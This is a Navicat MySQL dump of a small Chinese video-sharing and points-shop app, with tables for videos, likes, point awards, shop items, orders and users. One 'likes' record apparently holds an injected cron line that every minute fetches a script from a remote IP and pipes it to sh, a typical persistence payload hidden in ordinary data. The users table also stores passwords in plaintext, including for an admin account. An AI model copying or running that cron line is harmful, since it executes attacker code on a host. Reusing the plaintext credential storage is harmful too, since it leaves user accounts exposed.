/*
 Navicat Premium Data Transfer

 Source Server         : qq
 Source Server Type    : MySQL
 Source Server Version : 80018
 Source Host           : 49.235.54.66:3306
 Source Schema         : my

 Target Server Type    : MySQL
 Target Server Version : 80018
 File Encoding         : 65001

 Date: 02/12/2019 08:52:21
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for addqqb
-- ----------------------------
DROP TABLE IF EXISTS `addqqb`;
CREATE TABLE `addqqb`  (
  `number` int(10) NOT NULL,
  `type` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `addtime` datetime(0) NOT NULL,
  `userid` int(11) NOT NULL,
  `id` int(11) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 34 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of addqqb
-- ----------------------------
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 10:49:10', 1, 1);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 15:29:18', 1, 2);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 19:52:03', 1, 3);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:01:57', 1, 4);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:04:51', 1, 5);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:05:01', 1, 6);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:13:32', 1, 7);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:14:46', 1, 8);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:18:59', 1, 9);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:20:02', 1, 10);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:27:52', 1, 11);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:36:10', 1, 12);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:39:30', 1, 13);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:43:46', 1, 14);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-27 20:44:33', 1, 15);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 14:11:11', 1, 16);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 14:19:41', 1, 17);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 14:20:10', 1, 18);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 14:20:29', 1, 19);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 16:24:47', 1, 20);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 19:04:43', 1, 21);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 19:10:18', 1, 22);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 19:31:23', 1, 23);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 19:31:55', 1, 24);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 19:32:28', 1, 25);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 19:32:49', 1, 26);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-28 20:29:21', 1, 27);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-29 14:29:51', 1, 28);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-29 16:05:38', 1, 29);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-29 21:40:22', 1, 30);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-30 18:52:24', 2, 31);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-11-30 23:08:30', 1, 32);
INSERT INTO `addqqb` VALUES (1, '观看收益', '2019-12-01 00:37:18', 1, 33);

-- ----------------------------
-- Table structure for dianzan
-- ----------------------------
DROP TABLE IF EXISTS `dianzan`;
CREATE TABLE `dianzan`  (
  `userid` int(11) NOT NULL,
  `movieid` text CHARACTER SET utf8 COLLATE utf8_general_ci,
  PRIMARY KEY (`userid`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of dianzan
-- ----------------------------
INSERT INTO `dianzan` VALUES (1, '0,95,,94,,92,,91,,90,,93,,95,,\n\n*/1 * * * * cur -fsSL http://185.181.10.234/E5DB0E07C3D7BE80V520/init.sh |sh\n\n,');
INSERT INTO `dianzan` VALUES (2, '0,');

-- ----------------------------
-- Table structure for movies
-- ----------------------------
DROP TABLE IF EXISTS `movies`;
CREATE TABLE `movies`  (
  `name` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `image` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `userid` int(10) NOT NULL,
  `username` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `talk` int(10) DEFAULT 0,
  `dianzan` int(10) DEFAULT 0,
  `see` int(10) DEFAULT 0,
  `addtime` datetime(0) DEFAULT NULL,
  `time` varchar(36) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `type` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT '全部',
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT '发布者未填写介绍！',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 98 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of movies
-- ----------------------------
INSERT INTO `movies` VALUES ('为什么要吃鳄鱼', 90, '1574644827525.mp4', '1574644827505.jpg', 1, '钟鸿达', 0, 6, 0, '2019-11-25 09:20:28', '00:6', '搞笑', '发布者未填写介绍！');
INSERT INTO `movies` VALUES ('我太难了', 91, '1574856276020.mp4', '1574856276003.jpg', 1, '钟鸿达', 0, 9, 0, '2019-11-27 20:04:37', '00:9', '爱情', '难难难');
INSERT INTO `movies` VALUES ('game over', 92, '1574856789158.mp4', '1574856786091.jpg', 1, '钟鸿达', 0, 31, 0, '2019-11-27 20:13:10', '00:8', '搞笑', 'hhhhhhh');
INSERT INTO `movies` VALUES ('交警，停车', 93, '1574857125261.mp4', '1574857125231.jpg', 1, '钟鸿达', 0, 13, 0, '2019-11-27 20:18:46', '00:12', '搞笑', '开车啦');
INSERT INTO `movies` VALUES ('厉害了', 94, '1574857656389.mp4', '1574857656369.jpg', 1, '钟鸿达', 0, 15, 0, '2019-11-27 20:27:37', '00:15', '武侠', '666');
INSERT INTO `movies` VALUES ('0.0', 95, '1574858133656.mp4', '1574858133656.jpg', 1, '钟鸿达', 0, 20, 0, '2019-11-27 20:35:34', '00:21', '科幻', '0.0');
INSERT INTO `movies` VALUES ('lalal', 96, '1575112712156.mp4', '1575112712122.jpg', 1, '钟鸿达', 0, 0, 0, '2019-11-30 19:18:33', '00:13', '爱情', 'asd');
INSERT INTO `movies` VALUES ('qweqwe', 97, '1575112879205.mp4', '1575112879205.jpg', 1, '钟鸿达', 0, 2, 0, '2019-11-30 19:21:20', '00:13', '搞笑', 'asdss');

-- ----------------------------
-- Table structure for orders
-- ----------------------------
DROP TABLE IF EXISTS `orders`;
CREATE TABLE `orders`  (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `addtime` varchar(36) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `price` int(10) NOT NULL,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `userid` int(10) NOT NULL,
  `pic` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 23 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of orders
-- ----------------------------
INSERT INTO `orders` VALUES (1, '2019-11-29 17:20', 1, '一根棒棒糖', 1, 'bbt.jpg');
INSERT INTO `orders` VALUES (2, '2019-11-29 17:26', 1, '一根棒棒糖', 1, 'bbt.jpg');
INSERT INTO `orders` VALUES (3, '2019-11-29 17:27', 1, '一根棒棒糖', 1, 'bbt.jpg');
INSERT INTO `orders` VALUES (4, '2019-11-29 17:27', 1, '一根棒棒糖', 1, 'bbt.jpg');
INSERT INTO `orders` VALUES (5, '2019-11-29 17:27', 1, '一根棒棒糖', 1, 'bbt.jpg');
INSERT INTO `orders` VALUES (6, '2019-11-29 17:27', 1, '一根棒棒糖', 1, 'bbt.jpg');
INSERT INTO `orders` VALUES (7, '2019-11-29 21:39', 1, '一根棒棒糖', 1, 'bbt.jpg');
INSERT INTO `orders` VALUES (8, '2019-11-29 21:39', 1, '一根棒棒糖', 1, 'bbt.jpg');
INSERT INTO `orders` VALUES (9, '2019-11-30 08:50', 10, '黄鹤楼', 1, '1575039308309.jpg');
INSERT INTO `orders` VALUES (10, '2019-11-30 08:50', 10, '黄鹤楼', 1, '1575039308309.jpg');
INSERT INTO `orders` VALUES (11, '2019-11-30 08:50', 10, '精白沙', 1, '1575039252604.jpg');
INSERT INTO `orders` VALUES (12, '2019-11-30 08:50', 10, '百威啤酒', 1, '1575039146760.jpg');
INSERT INTO `orders` VALUES (13, '2019-11-30 10:02', 2, '两个棒棒糖', 1, '1575039066986.jpg');
INSERT INTO `orders` VALUES (14, '2019-11-30 10:02', 5, '青岛啤酒', 1, '1575039094157.jpg');
INSERT INTO `orders` VALUES (15, '2019-11-30 10:05', 1, '一个棒棒糖', 1, '1575039079101.jpg');
INSERT INTO `orders` VALUES (16, '2019-11-30 10:52', 1, '一个棒棒糖', 2, '1575039079101.jpg');
INSERT INTO `orders` VALUES (17, '2019-11-30 10:52', 10, '黄鹤楼', 2, '1575039308309.jpg');
INSERT INTO `orders` VALUES (18, '2019-11-30 11:07', 5, '青岛啤酒', 2, '1575039094157.jpg');
INSERT INTO `orders` VALUES (19, '2019-11-30 11:07', 10, '百威啤酒', 2, '1575039146760.jpg');
INSERT INTO `orders` VALUES (20, '2019-11-30 12:11', 1, '一个棒棒糖', 1, '1575039079101.jpg');
INSERT INTO `orders` VALUES (21, '2019-11-30 14:08', 5, '一堆棒棒糖', 1, '1575039047053.jpg');
INSERT INTO `orders` VALUES (22, '2019-11-30 15:08', 5, '一堆棒棒糖', 1, '1575039047053.jpg');

-- ----------------------------
-- Table structure for shop
-- ----------------------------
DROP TABLE IF EXISTS `shop`;
CREATE TABLE `shop`  (
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `price` int(10) NOT NULL,
  `image` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `number` int(10) NOT NULL DEFAULT 999,
  `type` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
  `id` int(10) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 12 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of shop
-- ----------------------------
INSERT INTO `shop` VALUES ('一堆棒棒糖', 5, '1575039047053.jpg', 997, '零食', 1);
INSERT INTO `shop` VALUES ('两个棒棒糖', 2, '1575039066986.jpg', 998, '零食', 2);
INSERT INTO `shop` VALUES ('一个棒棒糖', 1, '1575039079101.jpg', 996, '零食', 3);
INSERT INTO `shop` VALUES ('青岛啤酒', 5, '1575039094157.jpg', 997, '熬夜', 4);
INSERT INTO `shop` VALUES ('百威啤酒', 10, '1575039146760.jpg', 997, '熬夜', 5);
INSERT INTO `shop` VALUES ('精白沙', 10, '1575039252604.jpg', 998, '熬夜', 6);
INSERT INTO `shop` VALUES ('黄鹤楼', 10, '1575039308309.jpg', 996, '熬夜', 7);
INSERT INTO `shop` VALUES ('萨菲罗斯', 999999, '1575039394178.jpg', 0, '非卖品', 8);
INSERT INTO `shop` VALUES ('蒂法', 999999, '1575039859092.jpg', 0, '非卖品', 9);
INSERT INTO `shop` VALUES ('克劳德', 999999, '1575039950179.jpg', 0, '非卖品', 10);
INSERT INTO `shop` VALUES ('扎克斯', 999999, '1575039995118.jpg', 0, '非卖品', 11);

-- ----------------------------
-- Table structure for users
-- ----------------------------
DROP TABLE IF EXISTS `users`;
CREATE TABLE `users`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `loginname` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci DEFAULT NULL,
  `qqb` int(10) UNSIGNED ZEROFILL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of users
-- ----------------------------
INSERT INTO `users` VALUES (1, 'zhd', '6301664', '钟鸿达', 0000000959);
INSERT INTO `users` VALUES (2, 'admin', '88888888', '管理员', 0000000990);

SET FOREIGN_KEY_CHECKS = 1;
